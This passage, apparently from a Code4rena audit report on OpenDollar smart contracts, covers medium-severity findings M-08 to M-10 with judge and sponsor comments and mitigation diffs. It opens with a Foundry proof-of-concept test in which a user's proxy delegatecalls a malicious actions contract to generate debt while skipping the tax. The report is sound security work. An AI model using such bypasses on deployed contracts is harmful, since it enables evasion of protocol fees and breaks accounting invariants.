class=\"grvsc-source\">  function test_setup() public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    assertEq(totalVaults, vault721.totalSupply());</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    checkProxyAddress();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    checkVaultIds();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  function test_GenerateDebtWithoutTax() public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    fakeBasicActions = new FakeBasicActions();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address proxy = proxies[1];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    bytes32 cType = cTypes[1];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 vaultId = vaultIds[proxy][cType];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    bytes memory payload = abi.encodeWithSelector(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      fakeBasicActions.lockTokenCollateralAndGenerateDebt.selector,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      address(safeManager),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      address(taxCollector),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      address(collateralJoin[cType]),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      address(coinJoin),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      vaultId,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      1,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      0</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    vm.startPrank(users[1]);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Proxy makes a delegatecall to Malicious BasicAction contract and bypasses the TAX payment</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ODProxy(proxy).execute(address(fakeBasicActions), payload);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    genDebt(vaultId, 10, proxy);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    IODSafeManager.SAFEData memory sData = safeManager.safeData(vaultId);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address safeHandler = sData.safeHandler;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ISAFEEngine.SAFE memory SafeEngineData = safeEngine.safes(cType, safeHandler);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    assertEq(1, SafeEngineData.lockedCollateral);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    assertEq(10, SafeEngineData.generatedDebt);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n</details>\n<p>Test commands: <code>forge test --fork-url $ANVIL_RPC --match-test test_GenerateDebtWithoutTax</code></p>\n<h3 id=\"tools-used-2\" style=\"position:relative;\"><a href=\"#tools-used-2\" aria-label=\"tools used 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VSCode, Foundry</p>\n<h3 id=\"recommended-mitigation-steps-8\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-8\" aria-label=\"recommended mitigation steps 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Move the Tax payment mechanism into ODSafeManager contract. E.g:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"31\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  function modifySAFECollateralization(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    uint256 _safe,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    int256 _deltaCollateral,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    int256 _deltaDebt</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ) external safeAllowed(_safe) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+   ODSafeManager.SAFEData memory _safeInfo = _safeData[_safe];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+   ITaxCollector(_taxCollector).taxSingle(_safeInfo.collateralType);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    SAFEData memory _sData = _safeData[_safe];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ISAFEEngine(safeEngine).modifySAFECollateralization(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      _sData.collateralType, _sData.safeHandler, _sData.safeHandler, _sData.safeHandler, _deltaCollateral, _deltaDebt</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    emit ModifySAFECollateralization(msg.sender, _safe, _deltaCollateral, _deltaDebt);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/286#issuecomment-1783581168\">pi0neerpat (OpenDollar) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/286#issuecomment-1790469484\">MiloTruck (Judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>The warden has demonstrated how users can bypass tax collection by interacting with <code>ODSafeManager</code> through their own implementation contracts. Since this results in a loss of yield (protocol fees) and not assets (user funds), I believe medium severity is appropriate.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-08-collateral-could-be-transferred-to-an-address-which-is-not-safehandler-managed-by-the-safemanager\" style=\"position:relative;\"><a href=\"#m-08-collateral-could-be-transferred-to-an-address-which-is-not-safehandler-managed-by-the-safemanager\" aria-label=\"m 08 collateral could be transferred to an address which is not safehandler managed by the safemanager permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/267\">[M-08] Collateral could be transferred to an address, which is not <code>SAFEHandler</code> managed by the <code>SAFEManager</code></a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/267\">nmirchev8</a></em></p>\n<p>In the current implementation each safe has corresponding proxy contract inside <code>ODSafeManager</code> and corresponding <code>SAFEHandler</code> “proxy” which is deployed for each safe and used as safe’s address inside <code>SAFEEngine</code>.\nThe problem is that inside <code>ODSafeManager</code> <code>transferCollateral()</code> function there is no check wether the provided address is a valid safe and so the collateral could be “transferred” to any ordinary address.</p>\n<h3 id=\"impact-2\" style=\"position:relative;\"><a href=\"#impact-2\" aria-label=\"impact 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>This could result in contracts missbehaviour, or lost of funds as it breaks the invariant of “Each safe has a corresponding SAFEHandler” and so other accounting errors could appear as the new owner of the contract can transfer it where he wants directly calling <code>SafeEngine.sol</code> contract, which is also unwanted behaviour (To execute safe operations, bypassing <code>SafeManager.sol</code>)</p>\n<h3 id=\"proof-of-concept-8\" style=\"position:relative;\"><a href=\"#proof-of-concept-8\" aria-label=\"proof of concept 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<ol>\n<li>Alice has a safe with X amount of collateral and want to transfer it to Bob and passes his address.</li>\n<li>The transaction passes and now inside SAFEEngine Bob’s amount of collateral has increased, but if he want to do something with safe/s he has to have a proxy and a safe, for which he would be owner. So those “funds” which are for accounting don’t have corresponding vault and safe. They are assigned to an EOA</li>\n</ol>\n<h3 id=\"recommended-mitigation-steps-9\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-9\" aria-label=\"recommended mitigation steps 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>The issue is confirmed by sponsor, who suggested adding in a <code>safeHandler exists</code> check. </p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/267#issuecomment-1787699833\">pi0neerpat (OpenDollar) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/267#issuecomment-1791245351\">MiloTruck (Judge) commented</a>:</strong></p>\n<blockquote>\n<p>The warden has demonstrated how due to a lack of validation on the <code>_dst</code> parameter in <code>transferCollateral()</code> and <code>transferInternalCoins()</code>, the internal accounting of collateral and coins in the <code>SAFEEngine</code> contract can accrue to any arbitrary EOA, such as an attacker’s own address. This can be exploited to call functions in the <code>SAFEEngine</code> contract directly, which should not be possible.</p>\n<p>Since this report does not demonstrate how this could lead to a potential loss of funds for the protocol/users, I believe medium severity is appropriate.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/267#issuecomment-1806403276\">hals (Warden) commented</a>:</strong></p>\n<blockquote>\n<p>Hi, I think this is intended by design to transfer SAFE collateral to any address that doesn’t represent a SAFE (<code>safeHandler</code>).</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/267#issuecomment-1806741319\">MiloTruck (Judge) commented</a>:</strong></p>\n<blockquote>\n<p>@pi0neerpat, could you confirm if users should be able to call <code>transferCollateral()</code> and <code>transferInternalCoins()</code> in <code>ODSafeManager</code> to transfer their internal coin/collateral balance in <code>SAFEEngine</code> to any arbitrary address?</p>\n<p>The internal coins/collateral will not be stuck in the protocol as users can call <code>exit()</code> in <code>CollateralJoin</code> or <code>CoinJoin</code> to mint system coins or transfer out collateral.</p>\n<p>However, allowing internal balances to accrue to any arbitrary address means that users can call functions in the <code>SAFEEngine</code> contract directly, instead of through <code>ODSafeManager</code>. This was my original reason for medium severity, so it would be great if you could clarify if this should not be allowed.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/267#issuecomment-1806749683\">nmirchev8 (Warden) commented</a>:</strong></p>\n<blockquote>\n<p>In such way users can call functions on SAFEEngine contract directly, which breaks the invariants provided by the team.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/267#issuecomment-1809389017\">daopunk (OpenDollar) commented</a>:</strong></p>\n<blockquote>\n<p>I agree that user calls directly to the SafeEngine should not be allowed, thus a check that the destination address is an existing safeHandler should be made.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/267#issuecomment-1809508810\">MiloTruck (Judge) commented</a>:</strong></p>\n<blockquote>\n<p>Will maintain medium severity since this is unintended behavior, as mentioned by the sponsor, and seems to violate the following invariant from the <a href=\"https://github.com/code-423n4/2023-10-opendollar#main-invariants\">Audit’s README</a>:</p>\n<blockquote>\n<p>Users must exclusively use the ODProxy to interact with their safes.</p>\n</blockquote>\n</blockquote>\n<hr>\n<h2 id=\"m-09-vault721tokenuri-does-not-comply-with-erc721---metadata-specification\" style=\"position:relative;\"><a href=\"#m-09-vault721tokenuri-does-not-comply-with-erc721---metadata-specification\" aria-label=\"m 09 vault721tokenuri does not comply with erc721   metadata specification permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/243\">[M-09] Vault721.tokenURI does not comply with ERC721 - Metadata specification</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/243\">Haipls</a>, also found by <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/445\">kutugu</a> and <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/210\">twcctop</a></em></p>\n<p>According to the standard, the <code>tokenURI</code> method must be reverted if a non-existent tokenId is passed. In the Vault721 contract, this point was ignored. What leads to a <a href=\"https://eips.ethereum.org/EIPS/eip-721#:~:text=function%20tokenURI(uint256%20_tokenId)%20external%20view%20returns%20(string)%3B\">violation of the EIP721 spec</a>.</p>\n<h3 id=\"proof-of-concept-9\" style=\"position:relative;\"><a href=\"#proof-of-concept-9\" aria-label=\"proof of concept 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><a href=\"https://github.com/open-dollar/od-contracts/blob/v1.5.5-audit/src/contracts/proxies/Vault721.sol#L140-L142\">https://github.com/open-dollar/od-contracts/blob/v1.5.5-audit/src/contracts/proxies/Vault721.sol#L140-L142</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"32\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">proxies</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Vault721</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">   * </span><span class=\"mtk4\">@dev</span><span class=\"mtk3\"> generate URI with updated vault information</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">   */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">tokenURI</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_safeId</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uri</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// @audit should throw if safeId does not exist according to the ERC721-Metadata specification</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uri</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">nftRenderer</span><span class=\"mtk1\">.</span><span class=\"mtk11\">render</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_safeId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p>The responsibility for checking whether a token exists may be put on the nftRenderer depending on the implementation, and may also be missing, changed or added in the future. But the underlying Vault721 contract that is supposed to comply with the standard does not follow the specification.</p>\n<p>Similar problem with violation of ERC721 specification: <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/44\">https://github.com/code-423n4/2023-04-caviar-findings/issues/44</a></p>\n<h3 id=\"tools-used-3\" style=\"position:relative;\"><a href=\"#tools-used-3\" aria-label=\"tools used 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p><a href=\"https://eips.ethereum.org/EIPS/eip-721#specification\">https://eips.ethereum.org/EIPS/eip-721#specification</a></p>\n<h3 id=\"recommended-mitigation-steps-10\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-10\" aria-label=\"recommended mitigation steps 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Add a token existence check at the Vault721 level, example:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"33\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">   * </span><span class=\"mtk4\">@dev</span><span class=\"mtk3\"> generate URI with updated vault information</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">   */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">tokenURI</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_safeId</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uri</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+++ </span><span class=\"mtk11\">_requireMinted</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_safeId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uri</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">nftRenderer</span><span class=\"mtk1\">.</span><span class=\"mtk11\">render</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_safeId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/243#issuecomment-1789731499\">MiloTruck (Judge) commented</a>:</strong></p>\n<blockquote>\n<p>Although the impact is extremely limited, the function does violate the ERC-721 spec as shown <a href=\"https://eips.ethereum.org/EIPS/eip-721#:~:text=function%20tokenURI(uint256%20_tokenId)%20external%20view%20returns%20(string)%3B\">here</a>. As such, I agree with Medium Severity.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/243#issuecomment-1805207884\">pi0neerpat (OpenDollar) commented</a>:</strong></p>\n<blockquote>\n<p>This is a valid finding and recommendation is accurate.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-10-due-to-extremely-short-votingdelay-and-votingperiod-governance-is-practically-impossible\" style=\"position:relative;\"><a href=\"#m-10-due-to-extremely-short-votingdelay-and-votingperiod-governance-is-practically-impossible\" aria-label=\"m 10 due to extremely short votingdelay and votingperiod governance is practically impossible permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/202\">[M-10] Due to extremely short <code>votingDelay</code> and <code>votingPeriod</code>, governance is practically impossible</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/202\">Kaysoft</a>, also found by <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/441\">spark</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/438\">immeas</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/416\">Arz</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/354\">tnquanghuy0512</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/331\">perseus</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/213\">btk</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/207\">holydevoti0n</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/139\">fibonacci</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/74\">T1MOH</a>, and <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/369\">hals</a></em></p>\n<p><a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/gov/ODGovernor.sol#L41\">https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/gov/ODGovernor.sol#L41</a> </p>\n<p><a href=\"https://github.com/open-dollar/od-contracts/blob/v1.5.5-audit/src/contracts/gov/ODGovernor.sol#L31-L41\">https://github.com/open-dollar/od-contracts/blob/v1.5.5-audit/src/contracts/gov/ODGovernor.sol#L31-L41</a></p>\n<p>It is practically impossible for enough users to vote within a voting period of 4 seconds from the voting start time.</p>\n<h3 